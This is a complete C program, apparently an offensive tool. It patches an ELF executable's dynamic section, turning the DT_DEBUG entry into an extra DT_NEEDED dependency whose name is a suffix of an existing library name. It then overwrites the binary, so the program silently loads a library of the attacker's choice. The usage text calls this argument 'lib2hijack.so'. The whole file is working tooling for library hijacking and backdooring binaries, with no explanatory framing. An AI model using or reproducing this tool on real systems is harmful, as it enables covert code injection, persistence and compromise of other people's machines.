#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <elf.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>

int dynamicorrupt(char *elf_buff, char *target_lib)
{
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)elf_buff;
    Elf64_Shdr *shdr = (Elf64_Shdr *)&elf_buff[ehdr->e_shoff];
    char *string_table = &elf_buff[shdr[ehdr->e_shstrndx].sh_offset];
    Elf64_Phdr *phdr = (Elf64_Phdr *)&elf_buff[ehdr->e_phoff];
    Elf64_Dyn *dyn_base = NULL;
    char *dynstr_base = NULL;
    unsigned long seg_size = 0;
    unsigned long n_entries = 0;
    Elf64_Xword new_d_val = 0;
    int dt_needed_index = -1;
    int dt_debug_index = -1;

    for (int i = 0; i < ehdr->e_phnum; i++)
    {
        if (phdr[i].p_type == PT_DYNAMIC)
        {
            dyn_base = (Elf64_Dyn *)&elf_buff[phdr[i].p_offset];
            seg_size = phdr[i].p_filesz;
            n_entries = phdr[i].p_filesz / sizeof(Elf64_Dyn);
            break;
        }
    }

    if (dyn_base == NULL)
    {
        puts("PT_DYNAMIC header not found!");
        return 1;
    }

    for (int i = 0; i < ehdr->e_shnum; i++)
    {
        if (!strcmp(&string_table[shdr[i].sh_name], ".dynstr"))
        {
            dynstr_base = (char *)&elf_buff[shdr[i].sh_offset];
            break;
        }
    }

    if (dynstr_base == NULL)
    {
        puts(".dynstr section not found!");
        return 2;
    }

    for (int i = 0; i < n_entries; i++)
    {
        if (dyn_base[i].d_tag == DT_NEEDED &&
            !strcmp(&dynstr_base[dyn_base[i].d_un.d_val], target_lib))
            dt_needed_index = i;

        if (dyn_base[i].d_tag == DT_DEBUG)
            dt_debug_index = i;
    }

    if (dt_needed_index == -1)
        return 3;
    if (dt_debug_index == -1)
        return 4;

    dyn_base[dt_debug_index].d_tag = DT_NEEDED;
    
    if (dt_debug_index > dt_needed_index) {
        dyn_base[dt_debug_index].d_un.d_val = dyn_base[dt_needed_index].d_un.d_val;
        dyn_base[dt_needed_index].d_un.d_val = dyn_base[dt_debug_index].d_un.d_val+3; 
    } else
        dyn_base[dt_debug_index].d_un.d_val = dyn_base[dt_needed_index].d_un.d_val+3;

    return 0;
}

int main(int argc, char **argv)
{
    char *input_path;
    char *output_path;
    char *target_lib = "libc.so.6";

    switch (argc)
    {
    case 4:
        input_path = argv[1];
        output_path = argv[2];
        target_lib = argv[3];
        break;
    case 3:
        input_path = argv[1];
        output_path = argv[2];
        break;
    case 2:
        input_path = argv[1];
        output_path = input_path;
        break;
    default:
        printf("usage: %s <ELF_INPUT> <ELF_OUTPUT> <lib2hijack.so>\n", argv[0]);
        return 1;
    }

    int elf_input = open(input_path, 0, O_RDONLY);

    if (elf_input == -1)
    {
        perror("open");
        return 2;
    }

    struct stat elf_statbuf;

    if (fstat(elf_input, &elf_statbuf) == -1)
    {
        perror("fstat");
        return 3;
    }

    char *elf_buff = malloc(elf_statbuf.st_size);

    if (elf_buff == NULL)
    {
        perror("malloc");
        return 4;
    }

    if (elf_statbuf.st_size != read(elf_input, elf_buff, elf_statbuf.st_size))
    {
        perror("read");
        return 5;
    }

    close(elf_input);
    int ret = dynamicorrupt(elf_buff, target_lib);
    if (ret == 0)
    {
        int elf_output = open(output_path, O_CREAT | O_TRUNC | O_WRONLY, S_IRWXU);

        if (elf_output == -1)
        {
            perror("open");
            return 6;
        }

        if (elf_statbuf.st_size != write(elf_output, elf_buff, elf_statbuf.st_size))
        {
            perror("write");
            return 7;
        }
        close(elf_output);
    }

    free(elf_buff);
    return ret;
}